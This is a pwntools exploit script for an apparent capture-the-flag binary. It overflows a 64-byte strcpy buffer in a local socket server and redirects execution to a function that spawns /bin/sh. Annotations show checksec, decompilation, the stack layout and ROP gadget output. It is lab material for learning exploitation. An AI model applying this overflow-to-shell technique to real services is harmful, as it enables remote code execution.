from pwn import *
from tool.base import RunCmd
context.arch = "amd64"

a = RunCmd("/home/zz/Downloads/pwn_shell_server")
a.run()


p = remote("127.0.0.1", 1234)
# p = process("/home/zz/Downloads/pwn_shell_server")
p.recv(timeout=1)



p.send(b"w" * 72 + p64(0x4012B6))

p.interactive()

"""
❯ checksec --file=pwn_shell_server
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   80 Symbols	 No	0		4		pwn_shell_server
"""


"""
__int64 send_flag()
{
  __int64 result; // rax

  result = (unsigned int)client_fd;
  if ( client_fd != 100 )
  {
    puts("[INFO] Sending flag to client...");
    fflush(_bss_start);
    system("/bin/sh");
    puts("get shell");
    fflush(_bss_start);
    exit(0);
  }
  return result;
}

.text:00000000004012B6
.text:00000000004012B6 ; Attributes: bp-based frame
.text:00000000004012B6
.text:00000000004012B6                 public send_flag
.text:00000000004012B6 send_flag       proc near               ; DATA XREF: main+6F↓o
.text:00000000004012B6 ; __unwind {
.text:00000000004012B6                 endbr64
.text:00000000004012BA                 push    rbp
.text:00000000004012BB                 mov     rbp, rsp
.text:00000000004012BE                 mov     eax, cs:client_fd
.text:00000000004012C4                 cmp     eax, 64h ; 'd'
.text:00000000004012C7                 jz      short loc_401315
.text:00000000004012C9                 lea     rdi, s          ; "[INFO] Sending flag to client..."
.text:00000000004012D0                 call    _puts
.text:00000000004012D5                 mov     rax, cs:__bss_start
.text:00000000004012DC                 mov     rdi, rax        ; stream
.text:00000000004012DF                 call    _fflush
.text:00000000004012E4                 lea     rdi, command    ; "/bin/sh"
.text:00000000004012EB                 call    _system
.text:00000000004012F0                 lea     rdi, aGetShell  ; "get shell"
.text:00000000004012F7                 call    _puts
.text:00000000004012FC                 mov     rax, cs:__bss_start
.text:0000000000401303                 mov     rdi, rax        ; stream
.text:0000000000401306                 call    _fflush
.text:000000000040130B                 mov     edi, 0          ; status
.text:0000000000401310                 call    _exit
.text:0000000000401315 ; ---------------------------------------------------------------------------
.text:0000000000401315
.text:0000000000401315 loc_401315:                             ; CODE XREF: send_flag+11↑j
.text:0000000000401315                 nop
.text:0000000000401316                 pop     rbp
.text:0000000000401317                 retn
.text:0000000000401317 ; } // starts at 4012B6
.text:0000000000401317 send_flag       endp
.text:0000000000401317
"""

"""
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  _BYTE s[80]; // [rsp+0h] [rbp-70h] BYREF
  sockaddr addr; // [rsp+50h] [rbp-20h] BYREF
  int fd; // [rsp+6Ch] [rbp-4h]

  fd = socket(2, 1, 0);
  addr.sa_family = 2;
  *(_DWORD *)&addr.sa_data[2] = 0;
  *(_WORD *)addr.sa_data = htons(0x4D2u);
  bind(fd, &addr, 0x10u);
  listen(fd, 3);
  puts("Server is listening on port 1234...");
  printf(format, send_flag);
  printf(aSendFlag, 8);
  while ( 1 )
  {
    memset(s, 0, sizeof(s));
    client_fd = accept(fd, 0, 0);
    read(client_fd, s, 0x1F4u);
    vuln(s);
  }
}
"""

"""
.data:000000000040408E                 db    0
.data:000000000040408F                 db    0
.data:0000000000404090                 public client_fd
.data:0000000000404090 ; int client_fd
.data:0000000000404090 client_fd       dd 64h                  ; DATA XREF: send_flag+8↑r
.data:0000000000404090                                         ; main+C7↑w ...
.data:0000000000404094
"""

"""
int __fastcall vuln(const char *a1)
{
  char dest[64]; // [rsp+10h] [rbp-40h] BYREF

  puts("[INFO] Vulnerable function entered");
  strcpy(dest, a1);
  return puts("[INFO] vuln() finished normally (should not happen)");
}
"""

"""
000000000000004B     // padding byte
-000000000000004A     // padding byte
-0000000000000049     // padding byte
-0000000000000048     char *src;
-0000000000000040     char dest[64];
+0000000000000000     _QWORD __saved_registers;
+0000000000000008     _UNKNOWN *__return_address;
+0000000000000010
+0000000000000010 //
"""


"""
❯ ROPgadget --binary pwn_shell_server --rop

Gadgets information
============================================================
0x00000000004011fd : add ah, dh ; nop ; endbr64 ; ret
0x000000000040134d : add al, ch ; mov ebp, 0x90fffffd ; leave ; ret
0x000000000040122b : add bh, bh ; loopne 0x401295 ; nop ; ret
0x00000000004014bc : add byte ptr [rax], al ; add byte ptr [rax], al ; endbr64 ; ret
0x0000000000401036 : add byte ptr [rax], al ; add dl, dh ; jmp 0x401020
0x000000000040129a : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x00000000004014be : add byte ptr [rax], al ; endbr64 ; ret
0x00000000004011fc : add byte ptr [rax], al ; hlt ; nop ; endbr64 ; ret
0x000000000040100d : add byte ptr [rax], al ; test rax, rax ; je 0x401016 ; call rax
0x000000000040129b : add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000401299 : add byte ptr cs:[rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000040122a : add dil, dil ; loopne 0x401295 ; nop ; ret
0x0000000000401038 : add dl, dh ; jmp 0x401020
0x000000000040129c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401297 : add eax, 0x2e0b ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401085 : add eax, 0xf2000000 ; jmp 0x401020
0x0000000000401017 : add esp, 8 ; ret
0x0000000000401016 : add rsp, 8 ; ret
0x0000000000401314 : call qword ptr [rax + 0xff3c35d]
0x0000000000401352 : call qword ptr [rax + 0xff3c3c9]
0x000000000040103e : call qword ptr [rax - 0x5e1f00d]
0x0000000000401014 : call rax
0x00000000004012b3 : cli ; jmp 0x401240
0x0000000000401203 : cli ; ret
0x00000000004014cb : cli ; sub rsp, 8 ; add rsp, 8 ; ret
0x00000000004012b0 : endbr64 ; jmp 0x401240
0x0000000000401200 : endbr64 ; ret
0x000000000040149c : fisttp word ptr [rax - 0x7d] ; ret
0x00000000004011fe : hlt ; nop ; endbr64 ; ret
0x0000000000401012 : je 0x401016 ; call rax
0x0000000000401225 : je 0x401230 ; mov edi, 0x4040a0 ; jmp rax
0x0000000000401267 : je 0x401270 ; mov edi, 0x4040a0 ; jmp rax
0x000000000040103a : jmp 0x401020
0x00000000004012b4 : jmp 0x401240
0x0000000000401448 : jmp 0x4013f3
0x000000000040100b : jmp 0x4840103f
0x000000000040138f : jmp qword ptr [rsi - 0x77]
0x000000000040122c : jmp rax
0x0000000000401354 : leave ; ret
0x000000000040122d : loopne 0x401295 ; nop ; ret
0x0000000000401296 : mov byte ptr [rip + 0x2e0b], 1 ; pop rbp ; ret
0x000000000040134f : mov ebp, 0x90fffffd ; leave ; ret
0x0000000000401227 : mov edi, 0x4040a0 ; jmp rax
0x00000000004011ff : nop ; endbr64 ; ret
0x0000000000401353 : nop ; leave ; ret
0x0000000000401315 : nop ; pop rbp ; ret
0x000000000040122f : nop ; ret
0x00000000004012ac : nop dword ptr [rax] ; endbr64 ; jmp 0x401240
0x0000000000401226 : or dword ptr [rdi + 0x4040a0], edi ; jmp rax
0x0000000000401298 : or ebp, dword ptr [rsi] ; add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x00000000004014ac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004014ae : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004014b0 : pop r14 ; pop r15 ; ret
0x00000000004014b2 : pop r15 ; ret
0x00000000004014ab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004014af : pop rbp ; pop r14 ; pop r15 ; ret
0x000000000040129d : pop rbp ; ret
0x00000000004014b3 : pop rdi ; ret
0x00000000004014b1 : pop rsi ; pop r15 ; ret
0x00000000004014ad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040101a : ret
0x0000000000401011 : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
0x000000000040105b : sar edi, 0xff ; call qword ptr [rax - 0x5e1f00d]
0x00000000004011fb : sub eax, 0x90f40000 ; endbr64 ; ret
0x00000000004014cd : sub esp, 8 ; add rsp, 8 ; ret
0x00000000004014cc : sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000401010 : test eax, eax ; je 0x401016 ; call rax
0x0000000000401223 : test eax, eax ; je 0x401230 ; mov edi, 0x4040a0 ; jmp rax
0x0000000000401265 : test eax, eax ; je 0x401270 ; mov edi, 0x4040a0 ; jmp rax
0x000000000040100f : test rax, rax ; je 0x401016 ; call rax

Unique gadgets found: 70

ROP chain generation
===========================================================

- Step 1 -- Write-what-where gadgets

	[-] Can't find the 'mov qword ptr [r64], r64' gadget
"""

"""
data:0000000000404098 filename        dq offset aFlagTxt      ; "flag.txt"
.data:0000000000404098 _data           ends
.data:0000000000404098
.bss:00000000004040A0 ; ===========================================================================
.bss:00000000004040A0
.bss:00000000004040A0 ; Segment type: Uninitialized
.bss:00000000004040A0 ; Segment permissions: Read/Write
.bss:00000000004040A0 _bss            segment qword public 'BSS' use64
.bss:00000000004040A0                 assume cs:_bss
.bss:00000000004040A0                 ;org 4040A0h
.bss:00000000004040A0                 assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing
.bss:00000000004040A0                 public __bss_start
.bss:00000000004040A0 ; FILE *_bss_start
.bss:00000000004040A0 __bss_start     dq ?                    ; DATA XREF: LOAD:0000000000400548↑o
.bss:00000000004040A0                                         ; deregister_tm_clones↑o ...
.bss:00000000004040A0                                         ; Alternative name is '__TMC_END__'
.bss:00000000004040A0                                         ; stdout@@GLIBC_2.2.5
.bss:00000000004040A0                                         ; _edata
.bss:00000000004040A0                                         ; Copy of shared data
.bss:00000000004040A8 completed_8061  db ?                    ; DATA XREF: __do_global_dtors_aux+4↑r
.bss:00000000004040A8                                         ; __do_global_dtors_aux+16↑w
.bss:00000000004040A9                 align 10h
.bss:00000000004040A9 _bss            ends
.bss:00000000004040A9
.prgend:00000000004040B0 ; ===========================================================================
.prgend:00000000004040B0
.prgend:00000000004040B0 ; Segment type: Zero-length
.prgend:00000000004040B0 _prgend         segment byte public '' use64
.prgend:00000000004040B0 _end            label byte
.prgend:00000000004040B0 _prgend         ends
.prgend:00000000004040B0
extern:00000000004040B8 ; ===========================================================================
extern:00000000004040B8
extern:00000000004040B8 ; Segment type: Externs
"""
